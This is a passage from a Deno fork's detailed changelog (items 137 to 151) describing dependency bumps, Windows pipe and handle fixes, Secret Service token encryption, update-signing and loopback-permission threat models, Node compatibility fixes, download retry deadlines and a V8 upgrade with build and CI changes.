     Not changed (the audit's R2, upstream behaviour): `Deno.open` on a
     `\\.\pipe\` path and `Deno.stdin` read through the file system's
     `spawn_blocking`, one pending read per handle.

     Tests: `commandManyPipedStdinsDoNotExhaustBlockingPool`
     (`tests/unit/command_test.ts`, Windows only:
     `4 * hardwareConcurrency +
     4` children each wait for a file the parent
     writes before they read the 256 KiB written to their stdin; the file write
     and every child must finish within 60 s);
     `pending_async_pipe_writes_hold_no_blocking_thread` (`ext/io/pipe.rs`: with
     a two-thread blocking pool, eight 256 KiB writes nobody reads yet must
     leave room for a `spawn_blocking` task);
     `raw_pipe_reads_hold_no_blocking_thread_and_lose_no_data`
     (`libs/core/uv_compat/tests.rs`, Windows only: a `CreatePipe` pipe read
     through `uv_pipe_open`, stopped and restarted eight times on a two-thread
     pool, still leaves room for a `spawn_blocking` task and then delivers the
     bytes written to it).

138. **`fix(ext/node)`: `brotliDecompressSync` throws on invalid input**
     (`fix/supply-denext2`; `ext/node/ops/zlib/mod.rs`, `Cargo.toml`,
     `Cargo.lock`, `tests/unit_node/zlib_test.ts`). Cherry-picked from
     denoland/deno `main` with `-x` (6e9f66f5dc, #37084): the sync Brotli decode
     op ignored `BrotliDecoderDecompressStream`'s result, so a malformed stream
     (Node's `test-zlib-invalid-input.js` vector, a block switch after one
     declared block type; CVE-2026-111497's shape) came back as the output
     decoded so far instead of throwing, and a small input could expand into a
     large one first. It now reports the decoder's error through `onerror` as
     the async `write` path does. brotli 6.0.0 / brotli-decompressor 4.0.1 move
     to 9.1.1 / 6.2.0 (upstream: 9.1.0) and async-compression to 0.4.51
     (compression-codecs 0.4.46 / compression-core 0.4.34), so one brotli is in
     the lock, as upstream did. The lock was re-resolved here rather than taken
     from upstream's, which also moved unrelated `windows-sys` pins. Test:
     "brotli decompress rejects invalid block switch" (sync throws; the
     streaming decoder emits `error`, never `end`).

139. **`fix(deps)`: the locked vendored OpenSSL 3.5.0 → 3.5.5**
     (`fix/supply-denext2`; `Cargo.lock`). The fork production audit's U8:
     `openssl-src` 300.5.0+3.5.0 is in the lock through `keyring`'s `vendored`
     feature (`cli/Cargo.toml`) → `dbus-secret-service`'s `openssl?/vendored`.
     That is a weak feature: `openssl` is optional in `dbus-secret-service` and
     only its `crypto-openssl` feature turns it on, which nothing here enables,
     so no build of the fork compiles or links OpenSSL:
     `cargo tree -i openssl-sys --target all` prints nothing, and a Linux build
     has no `openssl-sys` build dir. The lock entry is what `cargo audit` and
     other lock scanners read, so it moves to 300.5.5+3.5.5, the newest 3.5
     release of the crate, with
     `cargo update -p openssl-src --precise 300.5.5+3.5.5` (a plain
     `-p openssl-src` would take 300.6.1+3.6.3, since `openssl-sys` asks for
     `^300.2.0`). OpenSSL's 3.5 advisories between the two
     (https://openssl-library.org/news/vulnerabilities-3.5/): 3.5.1
     CVE-2025-4575; 3.5.4 CVE-2025-9230, -9231, -9232; 3.5.5 CVE-2025-15467
     (High, CMS AuthEnvelopedData stack overflow), CVE-2025-11187, -15468,
     -15469, -66199, -68160, -69418, -69419, -69420, -69421, CVE-2026-22795,
     -22796. OpenSSL has since released 3.5.6 to 3.5.9 (among them High
     CVE-2026-45447, a `PKCS7_verify()` use-after-free, and CVE-2026-84782, DTLS
     retransmission), but no `openssl-src` 300.5.x carries them yet; the crate
     goes 300.5.5 → 300.6.0+3.6.2. Bump again when a 300.5.6+ appears, and
     re-check this if anything enables `crypto-openssl`.

140. **`ci`: a failed laufey or denort build skips `package`**
     (`fix/supply-denext2`; `.github/workflows/denext_runtime.yml`). The fork
     production audit's P10: `package` ran under `always()` whenever laufey and
     denort were not `cancelled`, so after a failed laufey (runs 40219825669,
     40212070048, 39521569522, 39271729376) every target's package job failed in
     `download-artifact` and then in each `!cancelled()` e2e step, burying the
     build failure and costing macOS minutes. `always()` was there for a
     `reuse_laufey_run_id` / `reuse_denort_run_id` dispatch, where those jobs
     are `skipped`; nothing in the workflow, its history or this file chose to
     package after a failure. `package` now needs each of them `success`, or
     `skipped` with its reuse run id set. With `fail-fast: false` one failed leg
     also skips the other targets' packaging; re-dispatch those `targets` with
     the failed run's id as `reuse_laufey_run_id` (its green legs' artifacts are
     there).

141. **`fix(security)`: the Deno Deploy token crosses the session bus
     encrypted** (`fix/secret-service-session-denext2`, CLI only;
     `cli/Cargo.toml`, `Cargo.lock`, `cli/tools/deploy.rs`,
     `.github/denext-runtime/assert_guard.py`,
     `.github/denext-runtime/assert_guard_test.py`,
     `.github/denext-runtime/e2e/linux/session.sh`,
     `.github/workflows/denext_tests.yml`). The CLI keeps the Deno Deploy token
     (`deno deploy`'s `op_deploy_token_get` / `_set` / `_delete`, and the
     tunnel's stored token in `cli/lib.rs`) in the OS store through the
     `keyring` crate, which on Linux talks to the Secret Service with
     `dbus-secret-service`. `keyring` 3.6.3 picks the transfer session at
     compile time: with neither `crypto-rust` nor `crypto-openssl` it opens
     `EncryptionType::Plain` (`keyring` `src/secret_service.rs`, `set_secret`
     and `map_matching_items`), so the token went over the session bus in clear,
     for any process that can monitor that bus to read. The CLI built `keyring`
     with `sync-secret-service` and `vendored` only. It now enables
     `crypto-rust` (RustCrypto, no OpenSSL), so every session is
     `dh-ietf1024-sha256-aes128-cbc-pkcs7` (Diffie-Hellman, then AES-128-CBC).
     `dbus-secret-service` does not fall back to plain, so a provider without
     that algorithm now refuses the call instead of taking the token in clear;
     gnome-keyring, KWallet and KeePassXC all offer it.
     - The lock gains `secret-service` 4.0.0 and its `zbus` tree because
       `keyring`'s `crypto-rust` names `secret-service?/crypto-rust`; Cargo
       locks weak dependencies, but `cargo tree` shows none of them is built
       (only `dbus-secret-service` with `crypto-rust`). `cargo audit` reports
       three new unmaintained warnings for them (`zbus_names`, `zvariant`,
       `zvariant_derive`: RUSTSEC-2026-0370 to -0372), and no vulnerability.
     - Test: `tools::deploy::tests::keyring_opens_an_encrypted_session` (Linux)
       starts a private `dbus-daemon`, owns `org.freedesktop.secrets` with a
       stand-in that records every `OpenSession` algorithm, runs a token lookup
       in a child process on that bus and requires the DH algorithm. Without
       `crypto-rust` it fails with `a plain transfer session was opened`. It
       skips without `dbus-daemon` unless `CI` is set.
     - The production audit's P6 guard: `assert_guard.py`, run by the lint job
       with its test, refuses a bare `test` / `[` / `[[` / `grep -q` statement
       (or one whose `||` branch exits with no message) in
       `.github/denext-runtime/**/*.sh` and the `run:` blocks of
       `.github/workflows/denext_*.yml`. The one it found, the e2e session's
       locked-keyring check, now prints an `::error::`.
     - tokio RUSTSEC-2026-0386 (`AsyncFd` constructors and I/O safety) is
       patched in 1.53.3, the only tokio in the lock; `cargo audit` with the
       advisory database of 2026-10-27 does not report it.

142. **`docs(desktop)`: why a packaged app's loopback grant covers every port**
     (fork security audit B-I2; `cli/rt/run.rs` comments only, no behavior
     change). `apply_desktop_permission_defaults` adds `127.0.0.1`, `localhost`
     and `[::1]` with no port to a packaged desktop app's net grant
     (`allow_net`, or `allow_net_connect` + `allow_net_listen` in the
     directional model, item 93's split). The audit asked for it to be narrowed
     to the ports the runtime needs. It stays as it is:
     - **The runtime itself needs no port.** The app's first `Deno.serve` is the
       in-process memory transport (`DENO_SERVE_ADDRESS=memory:…`,
       `op_net_listen_memory`, which checks no permission), the WebSocket relay
       is bound by `scheme_bridge::bind_ws_loopback_listener` and served in
       Rust, and the DevTools mux is the CLI's; the desktop init JS only reads
       `DENO_DESKTOP_MUX_WS`. The old comment calling the grant "structural" for
       the relay and the mux was wrong and is corrected; narrowing to the
       runtime's own ports means removing the grant.
     - **What uses it are loopback ports chosen at launch.** In denext: a
       sidecar's `port: "auto"` (`freePort()` in `src/desktop/sidecar-host.ts`
       binds `127.0.0.1:0`, then a `run: { module }` sidecar's worker binds that
       port and `sidecar-supervisor.ts` polls
       `http://127.0.0.1:<port><ready.http>`), `spa.proxy` / `proxy: true` to
       such a sidecar, and `openAuthSession`'s loopback redirect listener
       (`auth-session-runtime.ts`: `127.0.0.1:0`, or the app's `loopbackPort`,
       on `::1` for a `[::1]` redirect). Permissions are fixed when the worker's
       `Permissions` are built and a packaged app can't prompt, so a port
       learned at run time can't be added then; a compile-time port list would
       refuse every one of these.
     - **denext bakes the same grant itself.** `desktopBuildFlags`
       (`src/build/desktop-capabilities.ts`, `DESKTOP_LISTEN_BASELINE`) passes
       `127.0.0.1,localhost` to both directions, documented as "any port: the
       app's server picks one at launch" (`DesktopExtraPermissions.netListen` in
       `src/server/config.ts`), so narrowing the runtime's default would not
       narrow a denext app's grant at all. It would only remove `[::1]`, which
       denext does not bake and which a fixed-port `[::1]` OAuth redirect binds:
       that is the one documented feature narrowing would break.
     - `desktop.extraPermissions` is unaffected either way (the default only
       ever extends a scoped list and leaves an unscoped one alone).

     Risk accepted: app code (the trusted side; the page has no Deno
     permissions) can reach any loopback service, as `--allow-net=127.0.0.1`
     does in `deno run`
     ([Deno: permissions](https://docs.deno.com/runtime/fundamentals/security/)).
     An app that wants less passes `--deny-net-connect=127.0.0.1:<port>` (deny
     wins over allow). A narrower model (connect only to loopback ports this
     process has bound) would need new permission state shared with workers and
     is not done here.

143. **`docs(desktop)`: the Linux full-app update has no OS signature check, by
     design** (fork security audit E-I1; `runtime/ops/desktop_update/oscheck.rs`
     comment only). macOS requires the same Developer ID Team ID under an Apple
     anchor, and Windows the same Authenticode signer on every PE image (item
     18, item 127's E-L4); Linux reports `mode: "none"`. What guards a Linux
     update, and why nothing is added:
     - **The manifest signature is the whole trust chain, and it is the same one
       the other platforms start from.** The public key is baked into the
       running app at compile time (`desktop.update.publicKey`); the manifest is
       ECDSA P-256 over `"denext-app-update-v1\n" + signed`, and `signed` names
       the app identifier, version, `sequence` (a high-water mark), `expiresAt`,
       and per platform the archive's URL, size and SHA-256. The archive is
       refused unless its size and SHA-256 match, and the staged app's own
       embedded version must equal the manifest's and be newer than the
       installed one (`embedded.rs`; an AppImage's runtime is inside its
       squashfs, so it relies on the manifest alone). An attacker without the
       update key (a hostile mirror, a network attacker, a replaced file on the
       feed host) can't get an archive past this.
     - **What the OS check adds on macOS and Windows is a second, independent
       key**: a stolen update key alone still can't ship code there. Linux has
       no OS trust root to play that part. Desktop Linux runs any executable the
       user can write; kernel IMA appraisal is a machine policy with keys on the
       `.ima` keyring, set by the administrator, not something a per-user
       install can rely on
       ([IMA Kconfig](https://kernelsources.org/source/xref/linux/security/integrity/ima/Kconfig)).
       AppImage's embedded GPG signature isn't checked by the AppImage runtime
       ([AppImage docs: signing](https://docs.appimage.org/packaging-guide/optional/signatures.html);
       [Tauri: Linux code signing](https://v2.tauri.app/distribute/sign/linux/),
       "AppImage does not validate the signature"), and `.deb` / `.rpm`
       signatures are checked by the package manager, which a self-update
       doesn't go through.
     - **A detached signature from the same key adds nothing.** It is the same
       trust root, over bytes whose SHA-256 the signed manifest already binds;
       counting one key twice is the mistake TUF fixed in CVE-2020-6174
       ([TUF security](https://theupdateframework.io/security/)).
     - **A second, separately held key would add something** (Sparkle uses Apple
       code signing this way to trust a change of its EdDSA keys:
       [Sparkle: EdDSA migration](https://sparkle-project.github.io/documentation/eddsa-migration/);
       AppImageUpdate's proposed rule is the new image's signer must match the
       old one's), but it is a new publishing requirement (a second key to
       generate, hold offline and rotate) for denext's packaging and
       `publish-update`, not a check this runtime can add alone.

     Threat model on Linux, then: an update is as trustworthy as the custody of
     the update signing key. Keep it offline (`denext ota keygen`'s private key
     never belongs on the feed host), and rotate by shipping a release that
     bakes the new public key, signed with the old one. Comparable updaters do
     the same or less on Linux: Tauri's updater checks one minisign key on every
     platform ([Tauri updater](https://v2.tauri.app/plugin/updater/)), and
     electron-updater checks code signatures on macOS and Windows only
     ([electron-builder: auto update](https://www.electron.build/auto-update)).

144. **`fix(process)`: a Windows spawn without a handle list never overlaps
     another spawn's inheritable handles** (`fix/win-spawn-handle-list-denext2`,
     CLI and runtime; `runtime/subprocess_windows/src/process.rs`, `lib.rs`,
     `tests.rs`, `ext/io/bi_pipe.rs`, `ext/process/lib.rs`,
     `runtime/ops/desktop_update/swap.rs`, `cli/tsc/native.rs`). The rest of
     item 105. Every spawn through `deno_subprocess_windows` (`Deno.Command`,
     `Deno.run`, `node:child_process` with its IPC channel and extra `stdio`
     pipes) already passes `PROC_THREAD_ATTRIBUTE_HANDLE_LIST`, so those spawns
     never take each other's pipe ends. Rust's and tokio's
     `std::process::Command` can't: they call `CreateProcessW` with
     `bInheritHandles = TRUE` and no list (`CommandExt::raw_attribute`, which
     could pass one, is unstable, rust-lang/rust#114854), so a process spawned
     that way inherited whatever was inheritable at that moment: the duplicates
     a concurrent `Deno.Command` spawn had just made for its child, an IPC or
     extra-pipe end from `bi_pipe_pair_raw` (inheritable from birth), or a
     handle passed with `inherit_handle` (left inheritable after its spawn). A
     long-lived one kept that spawn's stdout open, as in item 105.
     - **One process-wide lock over the inheritable windows** (`INHERIT_WINDOW`,
       an `RwLock`): a `deno_subprocess_windows` spawn holds it shared from the
       moment it makes its child's inheritable handles until they are closed
       again (spawns with a handle list still overlap freely);
       `with_exclusive_inheritance(f)` (re-exported by `deno_process`) runs a
       list-less spawn holding it exclusively. Raymond Chen's fallback for when
       the handle list isn't available, applied only where it isn't.
     - **The list-less spawns that run beside a program's own spawns use it**:
       the desktop update helper (`spawn_detached` on Windows, which lives until
       the app exits) and the native `tsc` a type check starts.
     - **`bi_pipe_pair_raw`'s ends are created non-inheritable**: the spawn
       duplicates an extra pipe's end, and marks the IPC end inheritable for its
       own spawn only.
     - **A handle passed with `inherit_handle` gets its inherit flag back** as
       it was before the spawn, on every return path.

     Not changed (no program's spawn runs beside them in the same process, or
     the child is short-lived): `deno task`'s shell (`deno_task_shell` on tokio,
     under Rust's own spawn lock, with `os_pipe` pipes that are
     non-inheritable), npm lifecycle scripts, `deno upgrade` / `compile` /
     `install` / `x`, the LSP's tsgo server, git, and the npm state file of
     `cli/npm.rs` / `cli/tools/x.rs` (a file, not a pipe). Not fixable here: a
     grandchild a child leaves running holds the child's pipes on every OS.

     Tests: `inherit_handle_is_inheritable_only_during_its_spawn` and
     `std_spawns_take_no_pipe_ends_meant_for_another_child`
     (`runtime/subprocess_windows/src/tests.rs`: four threads run 25 piped
     `cmd /c echo` spawns each while two threads keep starting 30 s `ping`s
     through `std::process::Command`; the slowest must finish within 15 s),
     `bi_pipe_pair_raw_ends_are_not_inheritable` (`ext/io/bi_pipe.rs`), and
     `commandConcurrentExtraStdioSpawnsDoNotLeakPipes`
     (`tests/unit/command_test.ts`, Windows only; item 105's test extended to
     `node:child_process` with two extra `stdio` pipes on the short children and
     one on some long-lived ones).

145. **`fix(ext/node)`: `node:fs` argument checks, errors and `Dir` as in Node
     26** (`fix/node-compat-denext2`, runtime; `ext/node/polyfills/fs.ts`,
     `_fs/_fs_dir.ts`, `_fs/_fs_readdir.ts`, `_fs/cp/cp.ts`,
     `internal/fs/promises.ts`, `internal/fs/handle.ts`). The largest `fs`
     cluster of the 2026-10-28 node_compat re-measure
     (`plans/node-compat-gaps.md` in denext): calls that Node rejects at once
     reached the file system, and errors carried other codes, syscalls or stacks
     than Node's.
     - **`Dir` follows `lib/internal/fs/dir.js`.** `opendir` / `opendirSync`
       take `recursive: true` (Node 20.1; a returned directory entry is read
       after the entries already buffered, symlinks not followed), and
       `bufferSize` is checked by `Dir` as Node does (it was required to be set
       whenever `options` was an object, so `{ recursive: true }` threw). An
       asynchronous read that goes to the file system makes `readSync()` /
       `closeSync()` throw `ERR_DIR_CONCURRENT_OPERATION` and queues other calls
       behind it; a closed `Dir` throws `ERR_DIR_CLOSED` (also from
       `read(callback)`); `read(callback)` / `close(callback)` call back
       asynchronously and return `undefined`; the `path` getter is brand checked
       (`ERR_INVALID_THIS`). The directory is read once (the entries read to
       check it at open time are the ones handed out).
     - **`fs.promises` errors name the caller.** The promise functions are
       `async` functions named after the method, and a rejection's stack is
       captured in a reaction the method awaits, as Node's
       `handleErrorFromBinding` does: the trace shows `at async Object.access`
       and the user code that awaited it, not a frame inside the polyfill. An
       argument error now rejects instead of throwing.
     - **Checks before the call.** `writeFile` / `writeFileSync` / `appendFile*`
       validate the path (a null byte is `ERR_INVALID_ARG_VALUE`, not `EINVAL`
       from the OS), and `fs.promises.writeFile` / `appendFile` validate `data`
       before they open, so a bad `data` no longer creates the file. An unknown
       encoding is `ERR_INVALID_ARG_VALUE` for `readdir` (was an `Error` whose
       message held a Node 12 code), `readlink*` (a string option was ignored,
       and any encoding but utf8 / buffer threw "not implemented"; the link is
       now returned in any Buffer encoding, a `Buffer` for `"buffer"`),
       `mkdtemp*` (was `ERR_INVALID_ARG_TYPE` with a value reason) and
       `fs.watch` (whose string `options` were ignored).
       `FileHandle.read(0, ...)` rejects with `ERR_INVALID_ARG_TYPE`, and a
       `FileHandle` method called on another object rejects with
       `ERR_INTERNAL_ASSERTION`, as Node's `fsCall` does.
     - **Node 26 behaviour.** `fs.stat` with an already aborted `options.signal`
       calls back with an `AbortError`; async `fs.cp` with
       `errorOnExist: true, force: false` fails with `ERR_FS_CP_EEXIST` on an
       existing destination directory (Node's `onDir`; `cpSync` keeps erroring
       only on files, as Node's does); `readdir` errors name the `scandir`
       syscall (libuv's `uv_fs_scandir`), and `readdir` reads its options once,
       so changing the object after the call no longer changes a read in flight.

     Tests: node_compat `parallel/test-fs-access.js`, `-append-file.js`,
     `-assert-encoding-error.js`, `-cp-async-dir-exists-error-on-exist.mjs`,
     `-null-bytes.js`, `-opendir.js`, `-promises.js`, `-stat-abort-test.js` and
     `sequential/test-fs-opendir-recursive.js` enabled; unit tests in
     `tests/unit_node/_fs/_fs_dir_test.ts` (recursive reads, the concurrent
     operation error; the callback tests now expect Node's asynchronous
     callbacks), `_fs_opendir_test.ts` (an invalid encoding throws),
     `_fs_readdir_test.ts` (options read once, the `scandir` syscall) and
     `_fs_readlink_test.ts` (encodings).

146. **`feat(ext/node)`: a hook's `format: "commonjs"` source is imported as
     CommonJS, and `--input-type=module --eval` runs a module**
     (`fix/node-compat-denext2`, CLI and runtime; `cli/module_loader.rs`,
     `cli/rt/run.rs`, `ext/node/polyfills/01_require.js`,
     `libs/node_shim/lib.rs`). Follow-ups to item 109.
     - **CommonJS source from an ESM load hook.** When a
       `module.registerHooks()` / `module.register()` load hook answered an
       `import` with `format: "commonjs"` and a `source`, the source was
       evaluated as an ES module (`require is not defined`). As Node's ESM
       translator for CommonJS does, the module loader now wraps it: the source
       is compiled as a CommonJS module under the resolved URL (a file path for
       a `file:` URL), without a second load, and its `require()` calls go
       through the hooks; `module.exports` is the default export, the
       `"module.exports"` export and, by a static CommonJS export analysis (Node
       uses cjs-module-lexer), named exports. A `require()` of a URL a resolve
       hook invented without `//` (`virtual:shared`) now hands the load hook
       that URL instead of a file path under the working directory.
     - **`--input-type=module` with `--eval`.** The Node CLI shim wrapped every
       `--eval` string into a script for `vm.runInThisContext`, so an `import`
       statement was a syntax error. With `--input-type=module` (or
       `module-typescript`) the string is now passed to `deno eval` as the
       module it is, with `--ext=js` (`--ext=ts`), so TypeScript's emit can't
       drop an unused import binding and hide a missing export, and without the
       CommonJS `require` / builtin globals Node gives only a script.

     Tests: node_compat
     `module-hooks/test-module-hooks-load-import-cjs-custom-source.js`,
     `-require-wasm.js` and `test-async-loader-hooks-initialize-invoke.mjs`,
     `-initialize-process-exit.mjs`, `-initialize-rejecting.mjs`,
     `-process-exit-async.mjs`, `-register-with-import.mjs`,
     `-remove-beforeexit-listener.mjs` enabled (the last six were ignored for
     `--input-type=module --eval`; the three still ignored for it say what else
     they need); `es-module/test-esm-export-not-found.mjs` keeps passing for the
     right reason; `test_eval_input_type_module_is_not_wrapped`
     (`libs/node_shim`).

147. **`fix(ext/node)`: an HTTP server parse error carries llhttp's code**
     (`fix/node-compat-denext2`, runtime; `ext/node/ops/llhttp/binding.rs`,
     `ext/node/polyfills/_http_server.js`). On the server's consume fast path
     every llhttp error but a header overflow and an HTTP/2 preface became
     `HPE_ERROR` / "Parse Error", so a `clientError` listener couldn't tell an
     invalid method from a smuggling attempt, and only the `Transfer-Encoding` +
     `Content-Length` case was recovered in JavaScript. The error now has
     llhttp's errno name and reason, as `node_http_parser.cc` reports them
     (`HPE_INVALID_METHOD`, "Invalid method encountered"; message
     `Parse Error: <reason>`), and a server without a `clientError` listener
     answers `HPE_CHUNK_EXTENSIONS_OVERFLOW` with `413 Payload Too Large`, as
     Node's `socketOnError` does (the CVE-2024-22019 limit). An exception thrown
     in a parser callback stays `HPE_ERROR`.

     Tests: node_compat `parallel/test-http-server-client-error.js`,
     `-server-destroy-socket-on-client-error.js` and `-double-content-length.js`
     enabled.

148. **`fix(ext/node)`: Node 26's option sets for `NODE_OPTIONS` and Worker
     `execArgv`** (`fix/node-compat-denext2`, runtime;
     `ext/node/polyfills/internal/process/per_thread.mjs`,
     `ext/node/polyfills/worker_threads.ts`).
     `process.allowedNodeEnvironmentFlags` was a Node 16 list: 143 of Node
     26.5.1's flags were missing (`--disable-warning`, `--no-addons`,
     `--experimental-strip-types`, ...) and ten long-removed ones were listed.
     It is now Node 26.5.1's (the options its parser marks `kAllowedInEnvvar`,
     the `--no-` form of each boolean one, the aliases that expand to them),
     which tools such as mocha use to decide which flags go to `node`. A
     Worker's `execArgv` was checked against that same list, but Node parses it
     with the per-isolate option parser: every debug, environment and
     per-isolate option is valid there (`--expose-internals`,
     `--disable-warning=...`), and V8 options (`--expose-gc`,
     `--max-old-space-size`) are not, so both are now as in Node. A Worker `env`
     whose `NODE_OPTIONS` equals the parent's may carry the parent's per-process
     options (`{ env: process.env }`), as node_worker.cc allows.

     Tests: node_compat `es-module/test-esm-no-addons.mjs` enabled;
     `parallel/test-worker-execargv-invalid.js` and
     `test-process-env-allowed-flags.js` keep passing; unit tests
     `execArgv takes Node options that NODE_OPTIONS can't hold` and
     `V8 options in execArgv are rejected`
     (`tests/unit_node/worker_threads_test.ts`).

149. **`fix(http)`: the CLI's downloads give up on a stalled connection and
     retry on a new one** (`fix/download-deadlines-denext2`, CLI only;
     `cli/http_util.rs`, `cli/util/download_deadline.rs`, `cli/file_fetcher.rs`,
     `cli/npm.rs`, `ext/fetch/{lib,dns}.rs`, `libs/cli_parser/src/env_vars.rs`).
     Every download the CLI makes (npm packuments and tarballs, JSR and remote
     modules, the denort of `deno compile`, `deno upgrade`, `deno desktop`'s
     runtime) runs on a deno_fetch client whose only timeout is
     `pool_idle_timeout`, and was retried only after an error response. A
     registry that accepted a request and never answered, or stopped halfway
     through a body, held `deno install` / `deno cache` forever: denext's e2e
     sat silent for 10 minutes after about 606 `Download` lines (run
     40657805948), and a `deno cache` of a JSR module ran 551 s until a test
     watchdog killed it (run 40657792784). A stalled connection almost never
     recovers, and a new one usually answers at once, so each stage now has a
     short deadline and a download retries on a new connection:
     - **connect** (`DENO_DOWNLOAD_CONNECT_TIMEOUT_MS`, 10000): the TCP connect,
       set on the client's connector (hyper-util's `set_connect_timeout` through
       a new `CreateHttpClientOptions::connect_timeout`, `None` for every other
       client);
     - **response** (`DENO_DOWNLOAD_RESPONSE_TIMEOUT_MS`, 15000): from sending
       each request (and each redirect hop) to its response headers;
     - **idle** (`DENO_DOWNLOAD_IDLE_TIMEOUT_MS`, 20000): the longest gap
       between two reads of the body. It measures gaps, not the total, so a
       large tarball over a slow link keeps going as long as data arrives;
     - **attempts** (`DENO_DOWNLOAD_ATTEMPTS`, 4) with exponential backoff from
       250 ms (capped at 4 s) and equal jitter, and **total**
       (`DENO_DOWNLOAD_TOTAL_TIMEOUT_MS`, 120000): no new attempt starts once
       that much time has passed since the first. It never cuts off an attempt
       that is still receiving data.

     `0` turns a deadline off; a value that isn't a whole number keeps the
     default. All five are listed in `deno --help`.
     - **A retry after a stalled or broken connection runs on a new one.** The
       provider's client is now replaceable (`ClientPool`): the first request to
       hit a deadline on it replaces it, and with it its connection pool, so its
       retry, the retries of every other request that was in flight on the same
       HTTP/2 connection (each fails over on its own deadline), and every later
       request open one new connection instead of queueing on the dead one. The
       module loader's `HttpClient::send` path does the same.
     - **The final error lists every attempt**:
       `Timed out downloading '<url>'
       (4 attempts, each on a new connection):`
       then one line per attempt with the deadline that fired
       (`no response within 15s
       (DENO_DOWNLOAD_RESPONSE_TIMEOUT_MS)`,
       `no data received for 20s`, `could not connect within 10s`) or the error,
       and whether the total budget stopped the retries. When no attempt hit a
       deadline (only error responses), the first error is returned as before.
     - `download()` (used for lookups such as `deno upgrade`'s version checks)
       retries only connection failures and deadlines, not error responses.
     - The client is built as before apart from the connect timeout, so proxies,
       `--cert`, `DENO_TLS_CA_STORE` and `--unsafely-ignore-certificate-errors`
       are unchanged. Web `fetch()` in programs is not affected.
       `cli/util/retry.rs` is gone (its only callers now use the new loop).

     Tests (`cli/http_util.rs`, `cli/util/download_deadline.rs`):
     `download_retries_a_dead_http2_connection_on_a_new_one` (an HTTP/2 server
     whose first connection takes three concurrent downloads and never answers:
     all three succeed on one new connection, 15-30 s under the default
     deadlines), `send_replaces_a_stalled_connection`,
     `download_retries_a_server_that_never_answers_then_reports` and
     `download_retries_a_body_that_stops` (four attempts, four connections, the
     per-attempt report), `download_keeps_a_slow_but_steady_body` (a 22-byte
     body sent one byte every 100 ms under 500 ms deadlines and a 500 ms total),
     `parse_deadlines`, `retry_waits_grow_with_jitter`,
     `retry_budget_counts_attempts_and_total` and `deadline_error_message`; and
     the `cache::download_deadlines` spec (the test server's
     `/download_deadlines/` routes, 1 s deadlines, 3 attempts): a remote module,
     a JSR registry and an npm registry that never answer, a module and an npm
     registry whose body stalls, all failing with the per-attempt report; a
     module that stalls once and loads on the retry; and a module dripped two
     bytes every 200 ms that loads. Before the fix every stalled case ran until
     the step timeout.

150. **`chore(deps)`: V8 15.2 (the `v8` crate 152.2.0), and an engine staleness
     gate** (`chore/v8-bump-denext2`; runtime and CI; `libs/deno_v8`,
     `libs/core`, `ext/node`, `ext/webgpu`,
     `.github/denext-runtime/engine_staleness.py`). The runtime was on `v8`
     150.4.0 (V8 15.0.245.2, 2026-07-24), which gets no upstream V8 fixes any
     more, so a public JIT or type-confusion bug reachable from untrusted
     JavaScript could escape the permission sandbox. It now takes `v8` 152.2.0,
     V8 15.2.124.1: the newest rusty_v8 release (2026-08-20; its `main` still
     carries 15.2), and the one upstream's open
     [denoland/deno#36665](https://github.com/denoland/deno/pull/36665) adopts.
     Upstream's five commits and this fork's `dynamic.rs` adaptation land as one
     squashed commit (author kept, the upstream SHAs listed in its trailer), so
     every commit on the line builds: `Global::open` is now `unsafe`, so every
     call site takes the safe `v8::Local::new(scope, handle)` (this fork's
     `modules/map/dynamic.rs` too, where its dynamic-import code lives); setter
     and definer interceptors return `ReturnValue<Boolean>` (a
     `PropertyInterceptorReturnValue` alias in the facade keeps the QuickJS
     backend building); `MicrotaskQueue::new` returns an owning handle, which
     `node:vm` contexts now hold (`OwnedMicrotaskQueue`) instead of leaking; and
     `--no-validate-asm` is gone from the V8 flags: V8 removed the flag, and an
     unknown first flag made it drop every flag after it. The heap-limit tests
     in `libs/core` cap the isolate at 20 MB, since V8 15.2 no longer bootstraps
     in 5 MB.

     V8 15.2 is still behind Chrome stable (156 on 2026-10-27), so the setup job
     of `denext_runtime.yml` now runs `engine_staleness.py`: a V8 (Cargo.lock's
     `v8` crate, whose major is the Chrome milestone) or CEF (laufey's
     `CEF_FULL_VERSION`) pin more than one Chrome stable major behind is a
     warning on every run, and fails a release tag while
     `ENGINE_STALENESS_ENFORCE` is `tag` (`warn` keeps a tag at a warning). The
     workflow sets `warn` for now: rusty_v8 152.2.0 is the newest release there
     is, so `tag` would refuse every tag today; set it back to `tag` once a
     newer rusty_v8 can be taken. Chrome stable comes from Google's
     versionhistory API; when it can't be reached or read, the gate warns and
     passes. Covered by `engine_staleness_test.py` (the lint job of
     `denext_tests.yml`).

151. **`ci`: the Linux `deno` and `denort` run on glibc 2.27**
     (`feat/glibc-ceiling`, CI only; `denext_runtime.yml`,
     `.github/denext-runtime/linux_sysroot.sh`, `glibc_ceiling.py`,
     `manifest.py`). The fork production audit's P2: the release CLI and
     `denort` were linked against the runner's glibc (ubuntu-22.04: 2.35), so
     they failed to exec on RHEL / Rocky / Alma 9 and Amazon Linux 2023 (2.34),
     Debian 11 (2.31), Debian 10 and RHEL 8 (2.28) and Ubuntu 20.04 (2.31), all
     of which upstream Deno 2.9.8 runs on. The `cli` job now links both Linux
     targets against upstream Deno's own sysroot (`denoland/deno_sysroot_build`
     release `sysroot-20250207`, Ubuntu 18.04, glibc 2.27), as upstream's
     release builds do (`ci.ts` `sysRootConfig`): the archive is checked against
     a pinned SHA-256 per architecture, CC is Ubuntu 22.04's `clang-15` with the
     sysroot's `CFLAGS`, and the target's cargo linker is `clang-15` with
     `lld-15`, the sysroot's `-L` / `--sysroot` flags, `-ldl`,
     `--allow-shlib-undefined`, `tools/memfd_create_shim.c`,
     `tools/glibc_math_shim.c` and its five `--wrap`s. The flags go in
     `CARGO_TARGET_<TRIPLE>_RUSTFLAGS`, which joins `.cargo/config.toml`'s
     `--cfg tokio_unstable` (a `RUSTFLAGS` variable would replace it).
     Upstream's linker-plugin LTO is left out; the release profile's own LTO is
     unchanged.

     The ceiling is 2.27, and no lower, because that is the newest glibc the
     binaries need even from upstream's sysroot: upstream's own 2.9.8 `deno` and
     `denort` require `GLIBC_2.27` on both architectures, for `copy_file_range`
     (both) and V8's `pkey_*` memory-protection-key calls (x86_64), with
     `getrandom` / `getentropy` at 2.25 below them. A lower ceiling would need
     an older sysroot plus shims for those, which neither upstream nor the
     prebuilt `rusty_v8` archives are built or tested against. The alternatives
     were weighed and not taken: a `manylinux_2_28` container would give 2.28
     (one release worse) and move the job into a container on both runner
     architectures; `cargo zigbuild` with a `.2.27` target links the prebuilt
